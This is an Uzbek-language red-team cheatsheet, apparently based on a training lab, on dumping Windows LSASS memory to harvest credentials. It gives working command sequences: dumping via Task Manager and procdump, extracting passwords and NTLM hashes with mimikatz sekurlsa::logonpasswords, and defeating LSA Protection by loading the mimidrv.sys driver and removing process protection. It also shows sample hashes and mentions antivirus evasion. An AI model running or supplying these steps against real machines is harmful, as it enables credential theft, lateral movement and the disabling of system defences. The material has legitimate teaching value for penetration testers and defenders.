### 🧠 **LSASS nima?**

**LSASS (Local Security Authority Server Service)** — bu **Windows** operatsion tizimidagi **xavfsizlik siyosatini boshqaradigan** va uni tizimda **amalga oshiradigan jarayon** (process) hisoblanadi.

🔐 LSASS quyidagi vazifalarni bajaradi:

* Foydalanuvchi tizimga kirganini **tekshiradi** (autentifikatsiya).
* **Parollar, NTLM hashlar, Kerberos chiptalari** (tickets) kabi ma'lumotlarni boshqaradi.
* Foydalanuvchilar tarmoqli resurslarga (masalan, fayl ulashish, SharePoint, tarmoq xizmatlari) **har safar parol kiritmasdan** kirishi uchun credential’larni xotirada saqlaydi.

---

### 🎯 **Red Team uchun LSASS nega muhim?**

* LSASS jarayoni ichida **foydalanuvchi parollari, hashlari va tokenlar** saqlanadi.
* Shuning uchun u **qimmatli nishon (juicy target)** hisoblanadi.
* Agar bizda **Administrator huquqlari** bo‘lsa, biz **LSASS jarayonining xotirasini (memory)** nusxalab olishimiz mumkin.

---

### 🛠️ **LSASS Memory’ni Dump qilish (saqlab olish)**

Windows tizimida har qanday jarayonni **dump qilish**, ya’ni xotirasining “snapshot”ini yaratish mumkin. Bu jarayon orqali xotirada saqlanayotgan parollar va tokenlar olinadi.

Bu hujum **MITRE ATT\&CK** ramkasida quyidagicha tasniflanadi:

> **"OS Credential Dumping: LSASS Memory (T1003)"**

---

### 🖥️ **GUI orqali (grafik interfeys) LSASS’ni dump qilish:**

1. **Task Manager (Vazifalar boshqaruvchisi)** ni oching.
2. **Details** tab’iga o‘ting.
3. **lsass.exe** jarayonini toping.
4. Ustiga **o‘ng tugmani** bosing va **“Create dump file”** ni tanlang.

Bu bilan siz **LSASS jarayonining xotira nusxasini** (dump) olasiz. Keyinchalik bu dump faylni **mimikatz, pypykatz yoki procdump** kabi vositalar bilan analiz qilish mumkin.
![](https://github.com/akhatkulov/cheatsheets-for-windows/blob/main/Credentials%20Harvesting/Local%20Security%20Authority%20Subsystem%20Service%20(LSASS)/LSASS.png?raw=true)


Albatta! Quyidagi matn o‘zbek tiliga **to‘liq tarjima** qilinib, **izohlar bilan** taqdim etilgan:

---

## 🧠 **LSASS Dump tugagandan so‘ng nima qilish kerak?**

LSASS (Local Security Authority Subsystem Service) jarayoni xotirasini dumplaganimizdan so‘ng, Windows **pop-up oynasi orqali fayl joylashgan manzilni ko‘rsatadi**.

🔸 Siz bu `.DMP` faylni **AttackBox** (yoki boshqa analiz kompyuterga) ko‘chirishingiz kerak bo‘ladi — bu orqali **NTLM hashlarni offline yechish** (brute-force yoki boshqa usullar bilan) mumkin bo‘ladi.

> 🛑 Eslatma: VM (virtual mashina) ustida bu amallarni bajarayotganda **birinchi urinishda xatolik** chiqadi. Chunki **LSASS himoyasi yoqilgan** bo‘ladi (bu keyingi qismda o‘chiriladi).

---

## 📂 **LSASS dump faylini nusxalash:**

```cmd
copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
```

✅ Fayl `C:\Tools\Mimikatz\` ichiga nusxalandi. Endi uni analiz qilish mumkin.

---

## ⚙️ **ProcDump orqali LSASS dump qilish (GUI yo‘q bo‘lsa):**

Agar grafik interfeys mavjud bo‘lmasa, **`ProcDump`** vositasidan foydalanish mumkin. Bu **Sysinternals Suite** tarkibida bo‘lgan, **komandali satrda ishlaydigan vosita**.

🛠 Yo‘li:

```
C:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe C:\Tools\Mimikatz\lsass_dump
```

🔍 Natija:

```
[09:09:33] Dump 1 initiated...
[09:09:34] Dump complete: 163 MB written
```

> 🧨 Diqqat: Ushbu fayl **diskka yoziladi**. LSASS dump qilish — **xavfsizlik tahdidi** bo‘lgani sababli, ko‘p hollarda **antiviruslar tomonidan aniqlanadi va bloklanadi**. Haqiqiy hujum holatlarida, **shifrlash yoki chetlab o‘tish texnikalari** ishlatiladi.


**Mimikatz** — LSASS xotirasidan quyidagi ma’lumotlarni olish uchun ishlatiladi:

* 📌 Parollar (plain-text)
* 📌 NTLM hashlar
* 📌 PIN
* 📌 Kerberos chiptalari (ticket)
* 📌 DPAPI kalitlari

Shuningdek, quyidagi **post-exploitation** hujumlar uchun ham foydali:

* 🧩 **Pass-the-Hash**
* 🧩 **Pass-the-Ticket**
* 🧩 **Golden Ticket**

---

## ▶️ **Mimikatz ishga tushirish (Administrator sifatida):**

```cmd
C:\Tools\Mimikatz> mimikatz.exe
```

### 🎛 Privilegeni faollashtirish:

```mimikatz
privilege::debug
```

✅ `Privilege '20' OK` chiqsa, sizda **xotiraga kirish ruxsati mavjud**.

---

## 🔓 **sekurlsa::logonpasswords — xotiradagi credential’larni ko‘rish:**

```mimikatz
sekurlsa::logonpasswords
```

🧾 Misol natija:

```
User Name         : Administrator
NTLM             : 98d3a787a80d08385cea7fb4aa2a4261
SHA1             : 64a137cb8178b7700e6cffa387f4240043192e72
```

> ✅ Ushbu NTLM hash’ni **Hashcat** yoki boshqa vositalar orqali **bruteforce qilib ochish** mumkin.

> ⚠️ Diqqat: Bu credential’lar faqat **tizimga kirilgan foydalanuvchilar** uchun mavjud bo‘ladi.

---

## 🔐 **LSASS himoyasi (Protected LSASS) — LSA Protection**

2012-yildan boshlab Microsoft **LSA Protection** qo‘shdi. Bu himoya **LSASS xotirasiga to‘g‘ridan-to‘g‘ri kirishni bloklaydi**.

### 🧩 Registry orqali LSA ni yoqish:

```reg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
DWORD: RunAsPPL = 1
```

> Agar bu yoqilgan bo‘lsa, Mimikatz orqali `sekurlsa::logonpasswords` bajarilganda **xatolik chiqadi**:

```mimikatz
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

---

## 🛠 **Mimikatz’da LSA himoyasini chetlab o‘tish (mimidrv.sys yordamida):**

1. Mimikatz’da quyidagini bajaring:

```mimikatz
!+
```

> Bu **`mimidrv.sys` kernel drayver** yuklaydi. U orqali **LSASS himoyasini o‘chirish** mumkin.

2. Himoyani olib tashlash:

```mimikatz
!processprotect /process:lsass.exe /remove
```

✅ Endi `sekurlsa::logonpasswords` buyrug‘ini qayta bajarsangiz, **credential’lar ko‘rinadi**.

Jarayon:
```
cd C:\Tools\Mimikatz\mimikatz.exe
!+
!processprotect /process:lsass.exe /remove
privilege::debug
sekurlsa::logonpasswords
```
